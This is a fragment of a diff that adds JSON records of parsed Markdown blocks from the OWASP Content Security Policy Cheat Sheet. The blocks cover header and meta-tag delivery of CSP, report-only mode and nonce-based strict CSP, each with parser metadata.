+      "Policy Delivery",
+      "1. Content-Security-Policy Header"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00034",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 34,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```text\nContent-Security-Policy: ...\n```",
+    "text_hash": "5d576dd63316a14b1706437e15879e3c2b2c5e1b0361ceefb1378847ad4b2a3e",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 90,
+      "end_line": 92
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Policy Delivery",
+      "1. Content-Security-Policy Header"
+    ],
+    "heading_level": null,
+    "code_language": "text",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00035",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 35,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Using a header is the preferred way and supports the full CSP feature set. Send it in all HTTP responses, not just the index page.",
+    "text_hash": "a6654282d0e6c96bd764de2eae44628c519e9cc2ae7dbadc0cf0db4f288e5182",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 94,
+      "end_line": 94
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Policy Delivery",
+      "1. Content-Security-Policy Header"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00036",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 36,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "This is a W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+",
+    "text_hash": "e5d14a69485dee68cfd55d9add5785b8d3b090412438570b80e0ce3040db7bf8",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 96,
+      "end_line": 96
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Policy Delivery",
+      "1. Content-Security-Policy Header"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00037",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 37,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### 2. Content-Security-Policy-Report-Only Header",
+    "text_hash": "11a38c7bc4406faa00fe3939abbe631d8ad532a7a52d45252483e21cdfb368c8",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 98,
+      "end_line": 98
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Policy Delivery",
+      "2. Content-Security-Policy-Report-Only Header"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00038",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 38,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Using the `Content-Security-Policy-Report-Only`, you can deliver a CSP that doesn't get enforced.",
+    "text_hash": "8712a482fc0d78d8005b737ce07358dbaee53daa194968ef5b425dae647f4d07",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 100,
+      "end_line": 100
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Policy Delivery",
+      "2. Content-Security-Policy-Report-Only Header"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00039",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 39,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```text\nContent-Security-Policy-Report-Only: ...\n```",
+    "text_hash": "a849afe820c6dd62bf115f3898a4c842ca85a2058f527477c954aaac54a53ded",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 102,
+      "end_line": 104
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Policy Delivery",
+      "2. Content-Security-Policy-Report-Only Header"
+    ],
+    "heading_level": null,
+    "code_language": "text",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00040",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 40,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Still, violation reports are printed to the console and delivered to a violation endpoint if the `report-to` and `report-uri` directives are used.",
+    "text_hash": "e173b7a5284e0d821dccdc3f3cfe8476913a4d52210cc56f50e3e463f37a6963",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 106,
+      "end_line": 106
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Policy Delivery",
+      "2. Content-Security-Policy-Report-Only Header"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00041",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 41,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "This is also a W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+, whereby the policy is non-blocking (\"fail open\") and a report is sent to the URL designated by the `report-uri` (or newer `report-to`) directive. This is often used as a precursor to utilizing CSP in blocking mode (\"fail closed\")",
+    "text_hash": "ede271d5c4342b8206394e4687b21914eddde2130bad722c1c3ddbc4c6b6a37a",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 108,
+      "end_line": 108
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Policy Delivery",
+      "2. Content-Security-Policy-Report-Only Header"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00042",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 42,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Browsers fully support the ability of a site to use both `Content-Security-Policy` and `Content-Security-Policy-Report-Only` together, without any issues. This pattern can be used for example to run a strict `Report-Only` policy (to get many violation reports), while having a looser enforced policy (to avoid breaking legitimate site functionality).",
+    "text_hash": "a23f5a81441cee9c4a50853ffb610e8b34e055344b4b86df436d300fad000d1f",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 110,
+      "end_line": 110
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Policy Delivery",
+      "2. Content-Security-Policy-Report-Only Header"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00043",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 43,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### 3. Content-Security-Policy Meta Tag",
+    "text_hash": "04205102cc999e8f3ca41b03337d6d62a0aec7acf12a30ac07ca778235650665",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 112,
+      "end_line": 112
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Policy Delivery",
+      "3. Content-Security-Policy Meta Tag"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00044",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 44,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Sometimes you cannot use the Content-Security-Policy header if you are, e.g., Deploying your HTML files in a CDN where the headers are out of your control.",
+    "text_hash": "02b9931689eb89b8f94cd0879e4e5651127f13097e20c57f4c01ba64e6bf76a5",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 114,
+      "end_line": 114
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Policy Delivery",
+      "3. Content-Security-Policy Meta Tag"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00045",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 45,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "In this case, you can still use CSP by specifying a `http-equiv` meta tag in the HTML markup, like so:",
+    "text_hash": "70ffae0874e45d07c17cf91decf0e2746ad3927fd785c858fa1f761df2c0763e",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 116,
+      "end_line": 116
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Policy Delivery",
+      "3. Content-Security-Policy Meta Tag"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00046",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 46,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```html\n<meta http-equiv=\"Content-Security-Policy\" content=\"...\">\n```",
+    "text_hash": "4d1edee2ecb164d3739e6c999ebcc18377834c117af169950faf4653515d8424",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 118,
+      "end_line": 120
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Policy Delivery",
+      "3. Content-Security-Policy Meta Tag"
+    ],
+    "heading_level": null,
+    "code_language": "html",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00047",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 47,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Almost everything is still supported, including full XSS defenses. However, you will not be able to use [framing protections](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors), [sandboxing](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox), or a [CSP violation logging endpoint](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to).",
+    "text_hash": "b2feb55aba8034e1984a5a32295391a956100fe30796d36d612104b3c3ffc00b",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 122,
+      "end_line": 122
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Policy Delivery",
+      "3. Content-Security-Policy Meta Tag"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00048",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 48,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### WARNING",
+    "text_hash": "fe5befdf1219613c78be667d79192e1ca2555bf899248b91be8a627afe780b7f",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 124,
+      "end_line": 124
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Policy Delivery",
+      "WARNING"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00049",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 49,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "__DO NOT__ use `X-Content-Security-Policy` or `X-WebKit-CSP`. Their implementations are obsolete (since Firefox 23, Chrome 25), limited, inconsistent, and incredibly buggy.",
+    "text_hash": "996efc2a046270a48993151fcb05df1b5abaacc90f71bbc4d4be7188175bac09",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 126,
+      "end_line": 126
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Policy Delivery",
+      "WARNING"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00050",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 50,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "## CSP Types (granular/allowlist based or strict)",
+    "text_hash": "a48bb7e2ecc08e50e590795dfeb789017bd9999a35c409834eb5c1e1e6c3912a",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 128,
+      "end_line": 128
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Types (granular/allowlist based or strict)"
+    ],
+    "heading_level": 2,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00051",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 51,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "For original research on allowlist weaknesses, see [CSP Is Dead, Long Live CSP!](https://research.google/pubs/csp-is-dead-long-live-csp-on-the-insecurity-of-whitelists-and-the-future-of-content-security-policy/).",
+    "text_hash": "2daeac9e7856c381c28eabe2d1b7c53b1a3bb8309c5d2746de1af480bf665c95",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 130,
+      "end_line": 130
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Types (granular/allowlist based or strict)"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00052",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 52,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "The original mechanism for building a CSP involved creating allow-lists which would define the content and sources that were permitted in the context of the HTML page.",
+    "text_hash": "3e18fc490feb006ff4956fa79cea5ff0a5eaf7aeceb00dfc689785633906c875",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 132,
+      "end_line": 132
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Types (granular/allowlist based or strict)"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00053",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 53,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "However, current leading practice is to create a \"Strict\" CSP which is much easier to deploy and more secure as it is less likely to be bypassed.",
+    "text_hash": "1746bcaee619dfb812d61ccfa199ec6a38523fcc0540597c76f1ac1dd86c87d4",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 134,
+      "end_line": 134
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Types (granular/allowlist based or strict)"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00054",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 54,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "## Strict CSP",
+    "text_hash": "90ea7c22046265ce5c975573d902f5a97f8e6690bb1b896c5a712dd87fe3670c",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 136,
+      "end_line": 136
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Strict CSP"
+    ],
+    "heading_level": 2,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00055",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 55,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "A strict CSP can be created by using a limited number of the granular [Fetch Directives listed below](#fetch-directives) along with one of two mechanisms:",
+    "text_hash": "ee9df2e0228b8aa57908195e3e431493213e98769b6bd736d33a9734ed82afe1",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 138,
+      "end_line": 138
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Strict CSP"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00056",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 56,
+    "file_format": "MARKDOWN",
+    "block_type": "list",
+    "text_content": "- Nonce based\n- Hash based\n",
+    "text_hash": "5bdc016e774390573b5ebb1abfe24dc81cac57c61e32cfcd45949175b85d4ee8",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 140,
+      "end_line": 142
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Strict CSP"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00057",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 57,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "The `strict-dynamic` directive can optionally also be used to make it easier to implement a Strict CSP.",
+    "text_hash": "581ad7389988e4ceab36d4c95c9f1ced7221602b16acbe272bfb097c8836b8b0",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 143,
+      "end_line": 143
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Strict CSP"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00058",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 58,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "The following sections will provide some basic guidance to these mechanisms but it is strongly recommended to follow Google's detailed and methodological instructions for creating a Strict CSP:",
+    "text_hash": "caa55643d7d7ba5b873fb9a7353d72c0898075430a7971150f1a1577badd7d70",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 145,
+      "end_line": 145
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Strict CSP"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00059",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 59,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "__[Mitigate cross-site scripting (XSS) with a strict Content Security Policy (CSP)](https://web.dev/strict-csp/)__",
+    "text_hash": "68da0e6ae95394efef604149e3f171d45d409c37432995d2268f469b392571ce",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 147,
+      "end_line": 147
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Strict CSP"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00060",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 60,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### Nonce based",
+    "text_hash": "29736a7da42a68297dbf42f3a7f97bf66335a2f86d80e427f3fc7aa3e9b5efb5",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 149,
+      "end_line": 149
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Strict CSP",
+      "Nonce based"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00061",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 61,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Nonces are unique one-time-use random values that you generate for each HTTP response, and add to the Content-Security-Policy header, like so:",
+    "text_hash": "1be1b52cae474d8bb79a648ae6ca5539c9a1539f1aa403e8313eb20e0bf7bc29",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 151,
+      "end_line": 151
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Strict CSP",
+      "Nonce based"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00062",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 62,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```js\nconst nonce = uuid.v4();\nscriptSrc += ` 'nonce-${nonce}'`;\n```",
+    "text_hash": "b6af9914b279b6069c9760c9aa4fa527e336d2887cf76fbf7c68d6d17280421e",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 153,
+      "end_line": 156
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Strict CSP",
+      "Nonce based"
+    ],
+    "heading_level": null,
+    "code_language": "js",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00063",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 63,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "You would then pass this nonce to your view (using nonces requires a non-static HTML) and render script tags that look something like this:",
+    "text_hash": "9ad22476de08606c73393455b00f99b9ddb976c34c1b9484c27b8e3354d77564",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 158,
+      "end_line": 158
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Strict CSP",
+      "Nonce based"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00064",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 64,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```html\n<script nonce=\"<%= nonce %>\">\n    ...\n</script>\n```",
+    "text_hash": "dbcb80fca33347e9c45770788d9ee8ae0d6e3a3e21f85f744228483ee556ab0d",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 160,
+      "end_line": 164
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Strict CSP",
+      "Nonce based"
+    ],
+    "heading_level": null,
+    "code_language": "html",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00065",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 65,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "#### Warning",
+    "text_hash": "71dbbe29684074af6bc78e0aa70679a8c9f8f5d60bdb88cf948589591fd83865",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 166,
+      "end_line": 166
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Strict CSP",
+      "Nonce based",
+      "Warning"
+    ],
+    "heading_level": 4,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00066",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 66,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "__Don't__ create a middleware that replaces all script tags with \"script nonce=...\" because attacker-injected scripts will then get the nonces as well. You need an actual HTML templating engine to use nonces.",
+    "text_hash": "7316270d2744b01b86fa3ba1afcee1a16f10dcdc0ae757c5847024dc2d0566e8",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 168,
+      "end_line": 168
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Strict CSP",
+      "Nonce based",
+      "Warning"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
